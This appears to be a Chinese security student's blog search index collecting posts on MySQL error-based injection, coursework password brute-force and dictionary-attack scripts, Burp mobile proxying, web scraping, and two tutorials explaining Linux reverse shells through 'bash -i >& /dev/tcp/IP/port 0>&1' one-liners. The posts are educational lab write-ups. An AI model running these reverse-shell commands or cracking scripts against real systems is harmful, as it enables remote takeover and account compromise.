<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[mysql报错注入-脑回路]]></title>
    <url>%2F2019%2F10%2F22%2Fmysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-%E8%84%91%E5%9B%9E%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[写在前面​ 由于要找实习，面试被面试官问的怀疑狗生，所以近期打算复习一些基础。在复习到mysql报错注入的时候，我就发现了原来学习过程中遗留的问题，和一些忘记的知识点，和脑回路问题。例如此次要分享的，为什么floor（rand（1）*2)中count（）的结果很“古怪”？究其根本还是对细节的理解不够。在此，进行总结。 1. 提出问题​ 对于这个问题，出发点是看见报错注入分析中（https://xz.aliyun.com/t/253）说，“010和101开头的序列不会产生报错”。当时就在想按照原理，不应该是确定4位才可以保证无法通过注入嘛？（这是第一个问题），然后我在自己的mysql上试了试，又发现当一张表里有四条数据时rand(1)*2在count（）后出现的“怪事”。（这是第二个问题） ​ 为啥floor(rand(1)*2)中产生的序列是0100，但count（）后结果却是0和1分别出现2次 呢? 按照当下思路的分析（默认你会分析rand(0)*2），这里的结果是0和1 各是1次。但这里为什么出现的是2次呢？刚开始我也充满了疑问。。。 2.问题分析与解决0x01 问题一：答案：上述文章中关于0,1,0和1,0,1序列即可避免报错，这一说法是错误的。要保证无论如何都不会报错必须，至少确定4位序列，即0,1,0,0 或0,0,1,1或1,0,1,1或1,1,0,0。（有且只有这四种） 论证：为什么三位不行？ 0x02 问题二：​ 出现这种问题的原因是没有清楚理解count（），floor（rand（）*2），group by（）这三个函数的内涵。 ​ mysql官方有给过提示，就是查询的时候如果使用rand()的话，该值会被计算多次，那这个“被计算多次”到底是什么意思呢？就是在使用group by的时候，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次。即当虚表中已经出现有0和1这两个键的时候，则rand函数只会执行一次并被count（）到虚表。所以说，要产生主键重复的这类报错注入，必须在虚表没有包含0,1两个键之前进行！ select count(*) from referers group by floor(rand(1)*2); 这条语句中count(*)的值数相加是等于referers表中的条数的，而floor(rand(1)*2)的值，一部分，用于验证虚表中是否有这键，另一部分则是虚表中的键和对相同键的累加计数（count函数）。即建立虚表，floor(rand(1)2)条目数 &gt; referers条目数。 ​ 好了，理解到这里已经成功一半多了。可能你还是不懂上面floor（rand（1）*2）产生的0100的序列，最后count后居然0和1各占两个。先在我们用例子来说明一下。 ​ 举例： ​ users是一个条数比referers多的表，通过此命令我们可以发现rand（1）更长的序列，我们就可以分析出， ​ select count() from referers group by floor(rand(1)2); 第一次查询，虚表中添加的键是1（rand执行2次）； 第二次查询，虚表中添加的键是0（rand执行2次）； 第三次查询，结果是0（rand执行1次）； 第四次查询，结果是1（rand执行1次）。 最后查询语句select执行了共4次，rand共执行了6次。 ​ 所以最后会产生开篇那样两个键的值都是2的结果。]]></content>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码审计--熊海CMS]]></title>
    <url>%2F2019%2F08%2F11%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E7%86%8A%E6%B5%B7CMS%2F</url>
    <content type="text"></content>
      <tags>
        <tag>Code-audit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[某邮电大学信息安全专业课设小记]]></title>
    <url>%2F2019%2F05%2F06%2F%E6%9F%90%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%93%E4%B8%9A%E8%AF%BE%E8%AE%BE%E5%B0%8F%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[写在前面这是我大二的课设作业，为了记录所学，加之本次与HTTP和Python有关。就将之记录下来。本来是分配到第一个，但因理解偏差，做成第二个。。。于是，下面是两个题目的代码。 课设要求题目一：暴力破解密码 要求：1、设计一个信息系统，该系统可为学籍管理系统、订餐系统、票务管理系统不限，系统必须通过客户端录入账号口令远程登录； 2、系统内至少包含三个以上账号，密码为6位以上数字组成； 3、设计程序在该系统所在服务器端进行暴力密码破解，破解后将账号密码通过套接字发送出去； 4、在客户端用破解得到的账号口令进行登录，验证破解成功。 题目二：字典破解密码 要求：1、设计一个信息系统，该系统可为学籍管理系统、订餐系统、票务管理系统不限，系统必须通过客户端录入账号口令远程登录； 2、系统内至少包含三个以上账号，密码为6位以上任意字符组成； 3、设计程序设计程序在该系统所在服务器端进行字典密码破解，破解后将账号密码通过套接字发送出去； 字典举例： 当前账号信息： user：1234567 字典： 00000000 111111111 1234567 6666666666 Aaaaaaaa 1234567 为了破解用户名user的密码，将字典文件和密码进行依次比对，比对成功即破解。 4、在客户端用破解得到的账号口令进行登录，验证破解成功。 存放位置 服务器端代码服务器的主体是由socket建立起来的会话，我在里面内嵌了一个学生管理系统。为了信息安全，我将内部设置的密码进行了MD5加密，同时设置了一个日志文件，导入的time库是为了让程序与爆破端更好的对接，而shelve库是一个内置的小型数据库，存储用户名和加密后的密码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172#serverimport socketimport shelveimport hashlibimport loggingimport time#配置日志logging.basicConfig( level = logging.DEBUG, format = "%(asctime)s %(filename)s : %(levelname)s %(message)s", datefmt = "%Y-%m-%d %A %H:%M:%S", filename = "xxgl.log", filemode = "a")#查询学生信息def query(sdic,uname): sock.send(("请输入查询类型（1、全部记录；2、单条记录）：").encode()) data=sock.recv(1024).decode() op1=data if op1=="1": sock.send(str(sdic).encode()) data=sock.recv(1024).decode() logging.info("%s查询了全部学生记录"%uname) return 0 elif op1=="2": sock.send("请输入要查询的学号：".encode()) data=sock.recv(1024).decode() id=data logging.info("%s查询了学号为%s的学生记录"%(uname,id)) if id in sdic: sock.send(str(sdic[id]).encode()) else: sock.send("你输入的学号不存在！".encode()) logging.warning("%s查询了学号为%s的学生记录，但学生记录不存在。"%(uname,id))#增加记录def add(sdic,uname): while 1: sock.send(("请输入要增加的学号：").encode()) data=sock.recv(1024).decode() id=data if id not in sdic: break sock.send("该学号已存在，请重新输入！".encode()) continue sock.send(("请输入学号为%s的（名字：手机号）："%id).encode()) data=sock.recv(1024).decode() name=data.split(':')[0] phone=data.split(':')[1] sdic[id]=&#123;"name":name,"mobile":phone&#125; logging.info("%s添加了一条学号%s记录！"%(uname,id)) #修改记录def change(sdic,uname): while 1: sock.send(("请输入要修改信息的学号：").encode()) data=sock.recv(1024).decode() id=data if id in sdic: break logging.warning("修改的信息数据库中没有储存。") sock.send(("该学号不存在，请重新输入！,输入go继续。").encode()) data=sock.recv(1024).decode() sock.send(("请输入学号为%s的（名字：手机号）："%id).encode()) data=sock.recv(1024).decode() name=data.split(':')[0] phone=data.split(':')[1] sdic[id]=&#123;"name":name,"mobile":phone&#125; logging.info("%s更改了一条学号%s记录！"%(uname,id)) #删除记录def delete(sdic,uname): while 1: sock.send(("请输入要删除的学号：").encode()) data=sock.recv(1024).decode() id=data if id in sdic: break logging.warning("删除的信息数据库中没有储存。") sock.send(("该学号不存在，请重新输入！输入go继续。").encode()) del sdic[id] logging.info("%s删除了一条学号%s记录！"%(uname,id)) sock.send(("删除成功").encode())if __name__ == '__main__': while 1: s=socket.socket() s.bind(('0.0.0.0',9999)) s.listen(1) print("服务器已经准备就绪！") sock,addr=s.accept() print("%s连上了服务器，客户端使用端口是%d"%addr) logging.info("系统启动！") with shelve.open("学籍管理数据库") as db: try: accounts=db["accounts"] except: db["accounts"]=&#123;"admin":"e10adc3949ba59abbe56e057f20f883e","user1":"b427ebd39c845eb5417b7f7aaf1f9724","guest":"e10adc3949ba59abbe56e057f20f883e"&#125; #admin：123456s #user1：zxcvbn #guest：123456 accounts=db["accounts"] while 1: time.sleep(1) sock.send(("Enter USER：").encode()) data=sock.recv(1024).decode() uname=data sock.send(("Enter PASSWORD：").encode()) data=sock.recv(1024).decode() password=data if uname in accounts and accounts[uname]==hashlib.md5(password.encode()).hexdigest(): sock.send(("*-*-*-*-*-*-*-*-*-*-*登录成功！*-*-*-*-*-*-*-*-*-*-*").encode()) logging.info("用户%s登录成功！"%uname) try: sdic=db["students"] #sdic是学号 except: sdic=&#123;&#125; while 1: if uname=="admin": sock.send(("请选择要进行的操作（1、信息查询；2、增加记录；3、修改记录；4、删除记录；5、账户管理；6、退出）： ").encode()) data=sock.recv(1024).decode() op=data else: sock.send(("请选择要进行的操作（1、信息查询；6、退出）： ").encode()) data=sock.recv(1024).decode() op=data if op=="1": query(sdic,uname) elif op=="2": if uname=="admin": add(sdic,uname) else: sock.send(("输入有误！输入‘go’继续。").encode()) data=sock.recv(1024).decode() logging.error("%s存在越权操作。"%uname) continue elif op=="3": if uname=="admin": change(sdic,uname) else: sock.send(("输入有误！输入‘go’继续。").encode()) data=sock.recv(1024).decode() logging.error("%s存在越权操作。"%uname) continue elif op=="4": if uname=="admin": delete(sdic,uname) else: sock.send(("输入有误！输入‘go’继续。").encode()) data=sock.recv(1024).decode() logging.error("%s存在越权操作。"%uname) continue elif op=="5": pass elif op=="6": db["students"]=sdic sock.send(("感谢你的使用！下次再见！").encode()) data=sock.recv(1024).decode() logging.info("%s退出了信息管理系统！"%uname) break else: sock.send(("输入有误！输入‘go’继续。").encode()) data=sock.recv(1024).decode() continue else: sock.send(("输入有误！").encode()) logging.error("用户%s密码输入错误！"%uname) sock.close() 题目一的爆破端（客户）1234567891011121314151617181920212223242526272829303132#攻击脚本import socketimport times=socket.socket()#s.connect(('服务器ip',端口))s.connect(('127.0.0.1',9999))print("欢迎使用爆破小工具 作者：dog-river 版本：2.0")user=input("请输入要爆破的用户名：")passwd=str(input("请输入要爆破的密码范围（start-end）："))print('/*/*/*/*/*/*/*/*/*/* start - to - burst /*/*/*/*/*/*/*/*/*/*')start=int(passwd.split('-')[0])end=int(passwd.split('-')[1])while 1: r=s.recv(1024).decode() if r=="输入有误！": continueprint(r)if r=="Enter USER：": s.send(user.encode()) print(user)if r=="Enter PASSWORD：": for num in range(start,end): s.send(str(num).encode()) print(num) break start=int(start)+1if r=="*-*-*-*-*-*-*-*-*-*-*登录成功！*-*-*-*-*-*-*-*-*-*-*": breaks.close() 题目二的爆破端因为这是字典爆破，所以必须配备字典。将你要尝试的用户名和密码存放在与代码同一个文件夹中。如图；已知内置密码为admin/123456，为了爆破成功就写进去。而字典最后的‘5’是必须存在的，因为是用socket交互的为了正常，在后续必须还要send一个，从而保证程序正常运行。 123456789101112131415161718192021222324252627#攻击脚本import sockets=socket.socket()#s.connect(('服务器ip',端口))s.connect(('127.0.0.1',9999))print("欢迎使用爆破小工具 作者：dog-river 版本：1.0")while 1: with open ('dic.txt','r') as f: for test in f: line = test.replace('\n', '') #收 r=s.recv(1024).decode() #判断 if r=="输入有误！": continue if r=="*-*-*-*-*-*-*-*-*-*-*登录成功！*-*-*-*-*-*-*-*-*-*-*": print("*-*-*-*-*-*-*-*-*-*-*嘿嘿嘿*-*-*爆破成功！*-*-*-*-*-*-*-*-*-*-*") break #回显 print(r) print(line) #发 s.send(line.encode()) breaks.close() 服务器运行结果 运行后的目录中的样子 xxgl.log中的日志文件 学籍管理数据库.dat中存的用户和密码 题目一运行结果 题目二运行结果 写在最后我是直接粘贴过来的代码，应该是可以直接运行的，但也有可能有些地方因为格式而出错。就这样吧。。。]]></content>
      <tags>
        <tag>others</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux反弹shell（二）]]></title>
    <url>%2F2019%2F04%2F25%2FLinux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x01.写在前面Linux的反弹shell在前面的第一弹中了解了文件描述符和重定向，下来就开始对Linux反弹shell的更深层理解。 0x02.什么是反弹shell反弹shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell（反弹shell）与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。 0X03. 为什么要反弹shell通常用于被控端因防火墙受限、权限不足、端口被占用等情形 假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？ 1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。 2.它的ip会动态改变，你不能持续控制。 3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。 4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。 那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。 0x04.反弹shell的本质是什么我们可以先以一个linux 下的反弹shell 的命令为例来看一下反弹shell 的命令都做了些什么，掌握了反弹的本质，再多的方法其实只是换了包装而已。 实验环境： 受害者： RedHat Linux ——&gt; 192.168.10.10 攻击者： Kali Linux ——&gt; 192.168.10.54 我们就以最常见的bash为例：攻击者 机器上执行： 1nc -lvp 3333 受害者 机器上执行： 1bash -i &gt;&amp; /dev/tcp/192.168.10.54/3333 0&gt;&amp;1 你就会看到下图： 可以看到在攻击机上出现了受害者机器的shell 解释一下这条命令具体的含义： 1.bash -i 1）bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别 2）-i 这个参数表示的是产生交互式的shell 2./dev/tcp/ip/port /dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的，但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信 。 实例1： 我们输出字符串到这个文件里 攻击机上的输出 实例2： 攻击机上的输入 受害者机器上的输出 3.交互重定向 为了实现交互，我们需要把受害者交互式shell的输出重定向到攻击机上 在受害者机器上输入 1bash -i &gt; /dev/tcp/192.168.10.54/3333 示意图： 如下图所示，任何在受害者机器上执行的指令都不会直接回显了，而是在攻击者机器上回显。 （cat命令用于回显输出，受控机将输出定向到了反弹给kali的那个shell中了） 但是这里有一个问题，攻击者没有能够实现对受害者的控制，攻击者执行的命令没法在受害者电脑上执行。 于是我们似乎还需要一条这样的指令 1bash -i &lt; /dev/tcp/192.168.10.54/3333 示意图： 这条指令的意思是将攻击者输入的命令输入给受害者的bash，自然就能执行了 现在我们需要将两条指令结合起来： 1bash -i &gt; /dev/tcp/192.168.10.54/3333 0&gt;&amp;1 示意图： 由这张示意图可以很清楚地看到，输入0是由/dev/tcp/192.168.10.54/3333 输入的，也就是攻击机的输入，命令执行的结果1，会输出到/dev/tcp/192.168.10.54/3333上，这就形成了一个回路，实现了我们远程交互式shell 的功能 如下图所示，我在攻击机上输入 ifconfig，查看到的是受害者的ip ，也就是说我们目前已经基本完成了一个反弹shell 的功能。 注意： 但是这里有一个问题，就是我们在受害者机器上依然能看到我们在攻击者机器中执行的指令 ，如下图所示，我们马上解决 4. &gt;&amp;、&amp;&gt; 这个符号的作用就是混合输出（错误、正确输出都输出到一个地方） 现在我们解决一下前面的问题： 1bash -i &gt; /dev/tcp/192.168.10.54/3333 0&gt;&amp;1 2&gt;&amp;1 可以看到命令并没有回显在受害者机器上，我们的目的达成了 当然我们也可以执行与之完全等价的指令 1bash -i &gt;&amp; /dev/tcp/192.168.10.54/3333 0&gt;&amp;1 至此，这条经典的反弹shell的语句就分析完了，通过这次分析我们应该能理解反弹shell的本质。 0X05. bash的反弹shell 的语句怎么理解1.方法一1bash -i&gt;&amp; /dev/tcp/192.168.10.54/3333 0&gt;&amp;1 和 1bash -i&gt;&amp; /dev/tcp/192.168.10.54/3333 0&lt;&amp;1 这里的唯一区别就是 0&gt;&amp;1 和 0&lt;&amp;1 ，其实就是打开方式的不同，不过&lt;默认的是0，&gt;默认的是1。所以也可以出现（0&gt;，1&lt;）而对于这个文件描述符来讲并没有什么区别。 2.方法二1bash -i &gt;&amp; /dev/tcp/192.168.10.54/3333 &lt;&amp;2 等价于 1bash -i &gt;&amp; /dev/tcp/192.168.10.54/3333 0&lt;&amp;2 示意图： 上述的方法均是让0,1,2都指向/dev/tcp/192.168.10.54 0X06 .写在最后反弹shell水真深，网上一搜就会有一堆代码，但其原理不是很好理解。但通过这两次的总结，了解文件描述符和重定向后，相信对其的理解一定有帮助吧。下一篇我会总结不同语言对Linux的反弹shell的提权。]]></content>
      <tags>
        <tag>linux-shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux反弹shell（一）]]></title>
    <url>%2F2019%2F04%2F24%2FLinux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x01.写在前面做了几个月的Linux靶机，每此到最后都有一步反弹shell。哎，这个水感觉真的很深，每次我都是拿来直接用，没有研究其内部深层的知识。于是，就产生了好奇。这到底是个神马东西。其中最令人难以理解的绝逼是类似“0&gt;&amp;1 2&gt;&amp;1”的东西。 这就是文件描述符 和 重定向 ，我将从这开始说起。 0x02.文件描述符 是什么？ 文件描述符是非负整数。打开现存文件或新建文件时，内核会返回一个文件描述符。读写文件也需要使用文件描述符来指定待读写的文件。我的理解就是输入，输出，文件，这三者的接口，操作文件描述符就可以让数据在他们之间转移。 有哪些？ 当Linux启动的时候会默认打开三个文件描述符，分别是： 标准输入：standard input 0 （默认设备键盘）标准输出：standard output 1（默认设备显示器）错误输出：error output 2（默认设备显示器） （此处可以把键盘和显示器也理解为Linux的文件，纳闷继续往后看…） 注意！ （1）一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符。 （2）自己定义的文件描述符的范围是3-max，max=ulimit -n。（之前超无奈，不知道反弹shell中为什么会出现3,6,9等等，百度搜也搜不到。。。今天我可以拍着胸脯告诉你这是自己定义的！！哈哈） （3）以后分析反弹shell的时候可以画下面的图，超有帮助！ 一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。 0x03.重定向 重定向分类： （1）输入重定向 &lt; （2）输出重定向 &gt; （3）’&lt;&lt;’ ; ‘&gt;&gt;’ 称为附加方式，也就是平常说的追加。 注意！ 1.shell在执行命令时，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向，改变了输出方向，然后在把重定向去掉，执行指令。 2.指令如果出现多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果！！！！！（从上面的那个图很方便分析得出） 3.&lt; 是对标准输入 0 重定向 ，&gt; 是对标准输出 1 重定向（在反弹shell时一定要知道是对那个机子做的重定向） 4.再强调一下，重定向就是针对文件描述符的操作 1.输入重定向格式： [n]&lt; 1.txt （注意[n]与&lt;之间没有空格） 说明：将文件描述符 n 重定向到 1.txt 指代的文件（以只读方式打开）,如果n省略就是0（标准输入） 说明：解析器解析到 “&lt;” 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了1.txt ，于是cat就从file中读取指令了。(其实这个就像C语言中的指针或者文件句柄，就是将0这个指针指向了不同的地址，自然有不同的输入) 图示： 2.输出重定向格式： [n]&gt; 1.txt 说明： 将文件描述符 n 重定向到1.txt 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出） ；两个命令效果一致，第二个更像是用文本命令行创建一个文件。 图示： 3.标准输出与标准错误输出重定向格式： &amp;&gt; 1.txt &gt;&amp; 1.txt 说明: 将标准输出与标准错误输出都定向到1.txt代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 &gt; 1.txt 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1的) 解释：我们首先执行了一个错误的命令，可以看到错误提示被写入文件（正常情况下是会直接输出的），我们又执行了一条正确的指令，发现结果也输入到了文件，说明正确错误消息都能输出到文件。 图示： 4.文件描述符的复制！：这个与上面的区别是上者是写文件名，后者是写文件描述符（数字） 格式： [n]&lt;&amp;[m] / [n]&gt;&amp;[m] (这里所有字符之间不要有空格) 说明： 1）这里两个都是将文件描述符 n 复制到 m ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开 因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响） 2）这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符 图示： 这里就是上面那个的等价命令 插播：之前我们说过，重定向符号的顺序不能随便换，因为系统是从左到右执行的，我们下面就举一个例子 (1)cmd &gt; 1.txt 2&gt;&amp;1（上面已经说过）(2)cmd 2&gt;&amp;1 &gt;1.txt 现在来看第二条指令的过程 1.首先解析器解析到 2&gt;&amp;1 2.解析器再向后解析到 “&gt;” 5.exec 绑定重定向格式：exec [n] &lt;/&gt; 1.txt/[n] 上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令 6.文件描述符的读写方式：格式： [n]&lt;&gt;1.txt 说明：以读写方式打开1.txt指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。此处n可以在可控范围内随意指定 创建了一个文件描述符3，绑定到1.txt文件上（读写方式）， ls &gt;&amp;3将ls表示出来的东西输入到3中。 0x04.写在最后反弹shell的基础就是文件描述符和重定向。因为是学习，这篇文档借鉴了大量别人的东西。但我写出来只是想让自己记得更深刻一些。别无他意。 0x05.友情链接https://blog.csdn.net/ccwwff/article/details/48519119 （中有更详细的重定向语法） https://xz.aliyun.com/t/2548]]></content>
      <tags>
        <tag>linux-shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何用burpsuite抓取手机上的包]]></title>
    <url>%2F2019%2F04%2F14%2F%E5%A6%82%E4%BD%95%E7%94%A8burpsuite%E6%8A%93%E5%8F%96%E6%89%8B%E6%9C%BA%E4%B8%8A%E7%9A%84%E5%8C%85%2F</url>
    <content type="text"><![CDATA[目的实现对手机的数据包抓取 准备工作burpsuite，手机模拟器（夜神模拟器为例） 建设过程1.在手机模拟器上设置代理注意此处不能将代理设置为127.0.0.1因为127所指的是本机，但手机不能将代理设置在本机，它的目的是将包给电脑。所以此处设置成电脑所占据的无线ip！ 2.在brupsuite上也设置代理 3.在手机模拟器端下载证书输入http://burp 4.更改证书后缀名（der——cer） 5.导入证书 6.抓包验证抓包成功！]]></content>
      <tags>
        <tag>hack-text</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取猫眼电影TOP100与感悟]]></title>
    <url>%2F2019%2F04%2F12%2F%E7%88%AC%E5%8F%96%E7%8C%AB%E7%9C%BC%E7%94%B5%E5%BD%B1TOP100%E4%B8%8E%E6%84%9F%E6%82%9F%2F</url>
    <content type="text"><![CDATA[写在前面通过写这篇博客不仅仅是练习了爬虫的语法。更重要的是三点。 其一，体会到了Python三层结构（自己起的名字哈哈哈哈）的好处； 其二，对书写爬虫有了流程步骤感，可以更快的获得方向； 其三，对写正则表达式的规范书写。 目标 信息收集1.主页面信息收集猫眼电影TOP100的URL是https://maoyan.com/board/4，每页10个，共10页。 第2页的URLhttps://maoyan.com/board/4?offset=10； 第3页的URLhttps://maoyan.com/board/4?offset=20； 以此类推。一直到90是第10页。而且?offset=0等同于第1页。 2.分支页面信息收集点击进入页面源代码，寻找到要爬取的信息。并去横向对比每个信息是否采用同一种模板。 爬取步骤1.抓取单页内容 2.正则表达式分析 3.保存至文件 4.开启循环及段多线程 注：每一个步骤在后续对应一个函数 爬虫代码与讲解123456789101112131415161718192021222324252627282930313233343536import requestsimport reimport jsonfrom multiprocessing import Pooldef get_one_html(url): a=requests.get(url).text return adef get_message(html): pattern=re.compile('&lt;dd&gt;.*?board-index.*?(\d*)&lt;/i&gt;.*？ data-src="(.*?)".*?class="name".*?title="(.*?)".*?class="star"&gt;(.*?)&lt;/p&gt;.*?releasetime"&gt;(.*?)&lt;/p&gt;.*?class="integer"&gt;(.*?)&lt;/i&gt;.*?fraction"&gt;(\d)&lt;/i&gt;.*?&lt;/dd&gt;',re.S) results=re.findall(pattern,html) for result in results: yield&#123; 'index':result[0], 'image':result[1], 'title':result[2], 'actor':result[3].strip()[3:], 'Time':result[4].strip()[5:], 'score':result[5]+result[6] &#125;def save_file(content): with open ('TOP100.txt','a',encoding='utf-8') as f: f.write(json.dumps(content,ensure_ascii=False)+'\n') f.close()def main(offset): url="https://maoyan.com/board/4?offset="+str(offset) html = get_one_html(url) message=get_message(html) for i in message: save_file(i)if __name__ == '__main__': pool=Pool() pool.map(main,[i*10 for i in range(10)])# for i in range(10):# main(i*10) 我们按最初的步骤来讲解 1.抓取单页内容​ get_one_html（）函数采用requests库通过get方式获得了页面的源代码。 2.正则表达式分析​ get_message（）函数通过正则表达式表示出所需要的那些信息。然后调用yield 的函数在 Python 中被称之为 generator（生成器） 。通过for i in message: save_file(i) 对正则找到的信息进行遍历。 什么是yied？​ 简单地讲，yield 的作用就是把一个函数变成一个 generator，带有 yield 的函数不再是一个普通函数，Python 解释器会将其视为一个 generator，调用 get_message（） 不会执行 get_message（） 函数，而是返回一个 iterable 对象！在 for 循环执行时，每次循环都会执行 get_message（） 函数内部的代码，执行到 yield 时，get_message（） 函数就返回一个迭代值，下次迭代时，代码从 yield 的下一条语句继续执行，而函数的本地变量看起来和上次中断执行前是完全一样的，于是函数继续执行，直到再次遇到 yield。 3.保存至文件​ save_file（）函数是用来将for遍历yied中的结果存到一个文件中的函数。 123with open ('TOP100.txt','a',encoding='utf-8') as f: f.write(json.dumps(content,ensure_ascii=False)+'\n') f.close() 代码中建立了一个名为“TOP100.txt”的文件存放结果，a表示追加，因为yield产生的是一个字典（json）所以json.dumps（）的作用是将dict转化成str格式 。注意使用json.dumps()需要导入json库。encoding=&#39;utf-8&#39;和ensure_ascii=False的作用是让存在文件中的内容以中文表示，否则如下图。 4.开启循环及段多线程循环​ 12345678910def main(offset): url="https://maoyan.com/board/4?offset="+str(offset) html = get_one_html(url) message=get_message(html) for i in message: save_file(i)if __name__ == '__main__': for i in range(10): main(i*10) 在main（）函数中运行时导入offset参数，在if __name__ == &#39;__main__&#39;:中用循环输入对应的数值。 多线程采用多线程爬出来的顺序是乱的。 12345678from multiprocessing import Pool#略去中间代码if __name__ == '__main__': #声明一个进程池 pool=Pool() pool.map(main,[i*10 for i in range(10)]) 结果展示 写在最后1.Python三层结构哈哈，说过了这是我自己起的名字，它的三级其实是: 12345其他普通函数，主函数，if __name__ == &apos;__main__&apos;: if __name__ == &#39;__main__&#39;:会调用主函数，当然也可以给主函数传值；主函数中可以调用其他函数。这样避免了程序的死板。别人可能早就发现了，但我今天才发现。。。 2.流程步骤感干每一件事都有规律和顺序可言，当然写爬虫也是。对一个复杂的东西就去将它抽丝剥茧。那本题为例， 要爬取TOP100； 它分了10页； 每页又分了10个； 我们就先去搞一个； 获得到一个之后，正则表达； 获得想要的格式； 保存到文件； 遍历他们！ （好有步骤感） 3.正则表达式 找准目标—-判断正则表示类型—-前后夹击使得唯一确定出目标 前后夹击时如果是标签一定要把尖括号写完整 分行时采用(‘’+’’)格式 正则表达式外层用单引号，因为HTML内部常常是双引号。 （切记！！！）]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬虫闯关]]></title>
    <url>%2F2019%2F04%2F08%2F%E7%88%AC%E8%99%AB%E9%97%AF%E5%85%B3%2F</url>
    <content type="text"><![CDATA[第一关闯关地址：http://www.heibanke.com/lesson/crawler_ex00/ 思路： 在根据首页给的提示下，尝试在URL中输入数字，发现每一次都有新的。所以这是一个不断循环的，一直找到最后一个URL就闯关成功。根据源码对数字进行爬取。 12345678910111213141516171819# coding:utf-8import requestsimport reurl=&apos;http://www.heibanke.com/lesson/crawler_ex00/&apos;num_url=&apos;&apos;while 1: try: new_url=url+num_url print(new_url) data=requests.get(new_url).text #&lt;h3&gt;你需要在网址后输入数字64899&lt;/h3&gt; pattern=re.compile(&apos;&lt;h3&gt;.?(\d+).?&lt;/h3&gt;&apos;) result=re.search(pattern,data) num_url=result.group(1) except: print(&quot;THE END: &quot;+new_url) break 得到结果 总结： 本次我在result=re.search(pattern,data)上栽跟头！原先用的是match，但match是从头匹配！！！！对是从头！！！匹配！！！在开头的第一个字符就会去找&lt;h3&gt;,所以会导致NONE！！！ 第二关闯关地址：http://www.heibanke.com/lesson/crawler_ex01/ 思路： 在根据页面的提示下，昵称（随便）；密码（30以内数字）。得知就是对密码在0~30的穷举。对了就ok。 特别注意： ​ 此处为POST请求，所以请求时同时需要上传表单。大部分登录都是POST。 123456789101112131415161718#方法一：requests#coding=utf-8import requestsurl='http://www.heibanke.com/lesson/crawler_ex01/'playload=&#123;'username':'okok','password':'1'&#125;for i in range(31): playload['password']=i print('尝试密码是：'+str(i)) result=requests.post(url,data=playload) if '成功闯关' in result.text: print("ok!!") break 123456789101112131415161718192021222324252627282930313233343536#方法二：selenium#coding=utf-8from selenium import webdriverurl='http://www.heibanke.com/lesson/crawler_ex01/'browser=webdriver.Chrome()#wait=webDriverwait(browser,10)browser.get(url)try: for i in range(31): username=browser.find_element_by_name('username') username.clear() username.send_keys('koko') password=browser.find_element_by_name('password') password.clear() password.send_keys(i) browser.find_element_by_id('id_submit').click() returnText = browser.find_element_by_tag_name('h3') #returntext=wait.until(EC.presence_of_element_located((By.CSS_SELECTOR,'.col-xs-12 &gt; h3:nth-child(2)'))) 